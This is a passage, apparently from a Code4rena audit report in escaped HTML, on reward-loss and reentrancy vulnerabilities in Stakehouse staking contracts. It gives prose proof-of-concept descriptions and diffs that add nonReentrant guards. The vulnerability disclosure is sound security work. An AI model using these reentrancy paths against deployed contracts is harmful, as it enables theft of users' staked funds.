class=\"grvsc-line\"><span class=\"grvsc-source\">        emit LPBurnedForETH(msg.sender, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see it burn user <code>lpTokenETH</code> balance and don’t call either <code>_distributeETHRewardsToUserForToken()</code> or <code>_onWithdraw()</code>. and in function <code>claimRewards()</code> uses <code>lpTokenETH.balanceOf(msg.sender)</code> to calculate user rewards so if user balance get to <code>0</code> user won’t get the remaining rewards.\nThese are steps that this bug happens:</p>\n<ol>\n<li><code>user1</code> deposit <code>10</code> ETH into the giant pool and <code>claimed[user1][lpTokenETH]</code> is <code>20</code> and <code>accumulatedETHPerLPShare</code> is <code>2</code>.</li>\n<li>some time passes and <code>accumulatedETHPerLPShare</code> set to <code>3</code>.</li>\n<li><code>user1</code> unclaimed rewards are <code>10 * 3 - 20 = 10</code> ETH.</li>\n<li><code>user1</code> withdraw his <code>10</code> ETH by calling <code>withdrawETH(10)</code> and contract set <code>lpTokenETH</code> balance of <code>user1</code>  to <code>0</code> and transfer <code>10</code> ETH to user.</li>\n<li>now if <code>user1</code> calls <code>claimRewards()</code> he would get <code>0</code> reward as his <code>lpTokenETH</code> balance is <code>0</code>.</li>\n</ol>\n<p>so users lose their unclaimed rewards by withdrawing their funds.</p>\n<h3 id=\"tools-used-12\" style=\"position:relative;\"><a href=\"#tools-used-12\" aria-label=\"tools used 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>User’s unclaimed funds should be calculated and transferred before any actions that change user’s balance.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/260#issuecomment-1329424012\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-20-possibly-reentrancy-attacks-in-_distributeethrewardstouserfortoken-function\" style=\"position:relative;\"><a href=\"#h-20-possibly-reentrancy-attacks-in-_distributeethrewardstouserfortoken-function\" aria-label=\"h 20 possibly reentrancy attacks in _distributeethrewardstouserfortoken function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328\">[H-20] Possibly reentrancy attacks in <code>_distributeETHRewardsToUserForToken</code> function</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328\">rotcivegaf</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/414\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/341\">0x4non</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/35\">clems4ever</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340</a></p>\n<p>The root of the problem is in the <code>_distributeETHRewardsToUserForToken</code> which makes a call to distribute the ether rewards. With this call, the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This functions use the <code>_distributeETHRewardsToUserForToken</code>:</p>\n<h4 id=\"beforetokentransfer-giantmevandfeespool-contract\" style=\"position:relative;\"><a href=\"#beforetokentransfer-giantmevandfeespool-contract\" aria-label=\"beforetokentransfer giantmevandfeespool contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167\"><code>beforeTokenTransfer</code>, <strong>GiantMevAndFeesPool</strong> contract</a>:</h4>\n<p>The contract <strong>GiantLP</strong> use the <strong>GiantMevAndFeesPool</strong> contract as <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14\"><code>transferHookProcessor</code></a> and when use the functions <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol\"><code>_mint</code>, <code>_burn</code>, <code>transferFrom</code> and <code>transfer</code> of the ERC20</a>, the function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167\"><code>beforeTokenTransfer</code></a> implemented in the <strong>GiantMevAndFeesPool</strong> bring a possibility to make a reentrancy attack because in the function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73\"><code>_distributeETHRewardsToUserForToken</code></a> implemented in the <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68\"><strong>GiantMevAndFeesPool</strong> make a <code>call</code> to the <code>_recipient</code></a></p>\n<p>A contract can call the function <code>transfer</code> of <strong>GiantLP</strong> contract several time, transfer an <code>amount</code> from and to self, as the update of the <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203\"><code>claimed</code></a> would not be done until, it is executed the function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47\"><code>_afterTokenTransfer</code></a> of the <strong>GiantLP</strong> contract, the <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61\"><code>due</code></a> amount calculated in <code>_distributeETHRewardsToUserForToken</code> of <strong>SyndicateRewardsProcessor</strong> contract and the <code>lastInteractedTimestamp</code> of <strong>GiantLP</strong> contract will be incorrect</p>\n<h4 id=\"withdrawlptokens-giantpoolbase-contract\" style=\"position:relative;\"><a href=\"#withdrawlptokens-giantpoolbase-contract\" aria-label=\"withdrawlptokens giantpoolbase contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90\"><code>withdrawLPTokens</code>, <strong>GiantPoolBase</strong> contract</a>:</h4>\n<p>The possibility of the reentrancy is given when call function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74\"><code>_onWithdraw</code></a>, this function implemented in <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193\"><strong>GiantMevAndFeesPool</strong> contract</a> uses <code>_distributeETHRewardsToUserForToken</code> and this one call the recipient making the possibility of the reentrancy, breaking the code of <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89\">L76-L89</a></p>\n<h4 id=\"batchdepositethforstaking-stakingfundsvault-contract\" style=\"position:relative;\"><a href=\"#batchdepositethforstaking-stakingfundsvault-contract\" aria-label=\"batchdepositethforstaking stakingfundsvault contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104\"><code>batchDepositETHForStaking</code>, <strong>StakingFundsVault</strong> contract</a>:</h4>\n<p>The possibility of the reentrancy is given when call function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93\"><code>_distributeETHRewardsToUserForToken</code></a>, this function call the recipient making the possibility of the reentrancy, breaking the code of <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107\">L76-L89</a></p>\n<h4 id=\"depositethforstaking-stakingfundsvault-contract\" style=\"position:relative;\"><a href=\"#depositethforstaking-stakingfundsvault-contract\" aria-label=\"depositethforstaking stakingfundsvault contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143\"><code>depositETHForStaking</code>, <strong>StakingFundsVault</strong> contract</a>:</h4>\n<p>The possibility of the reentrancy is given when call function <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133\"><code>_distributeETHRewardsToUserForToken</code></a>, this function call the recipient making the possibility of the reentrancy, breaking the code of <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142\">L136-L142</a></p>\n<h4 id=\"beforetokentransfer-stakingfundsvault-contract\" style=\"position:relative;\"><a href=\"#beforetokentransfer-stakingfundsvault-contract\" aria-label=\"beforetokentransfer stakingfundsvault contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340\"><code>beforeTokenTransfer</code>, <strong>StakingFundsVault</strong> contract</a>:</h4>\n<p>The possibility of the reentrancy is given when call function <code>_distributeETHRewardsToUserForToken</code> in <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333\">L333</a> and <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337\">L337</a>, this function call the recipient making the possibility of the reentrancy, breaking the code of <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351\">L343-L351</a></p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>One possibility is to wrap(<code>deposit</code>) ether in WETH and transfer as ERC20 token.</p>\n<p>Another is to add <code>nonReentrant</code> guard to the functions:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167\"><code>beforeTokenTransfer</code>, <strong>GiantMevAndFeesPool</strong> contract</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90\"><code>withdrawLPTokens</code>, <strong>GiantPoolBase</strong> contract</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104\"><code>batchDepositETHForStaking</code>, <strong>StakingFundsVault</strong> contract</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143\"><code>depositETHForStaking</code>, <strong>StakingFundsVault</strong> contract</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340\"><code>beforeTokenTransfer</code>, <strong>StakingFundsVault</strong> contract</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: contracts/liquid-staking/GiantMevAndFeesPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function beforeTokenTransfer(address _from, address _to, uint256) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(msg.sender == address(lpTokenETH), &quot;Caller is not giant LP&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         updateAccumulatedETHPerLP();</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: contracts/liquid-staking/GiantPoolBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 amountOfTokens = _lpTokens.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(amountOfTokens &gt; 0, &quot;Empty arrays&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(amountOfTokens == _amounts.length, &quot;Inconsistent array lengths&quot;);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: contracts/liquid-staking/StakingFundsVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -66,7 +66,7 @@ contract StakingFundsVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Batch deposit ETH for staking against multiple BLS public keys</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _blsPublicKeyOfKnots List of BLS public keys being staked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _amounts Amounts of ETH being staked for each BLS public key</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numOfValidators = _blsPublicKeyOfKnots.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(numOfValidators &gt; 0, &quot;Empty arrays&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(numOfValidators == _amounts.length, &quot;Inconsistent array lengths&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -110,7 +110,7 @@ contract StakingFundsVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Deposit ETH against a BLS public key for staking</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _amount Amount of ETH being staked</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, &quot;BLS public key is banned or not a part of LSD network&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -312,7 +312,7 @@ contract StakingFundsVault is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    function beforeTokenTransfer(address _from, address 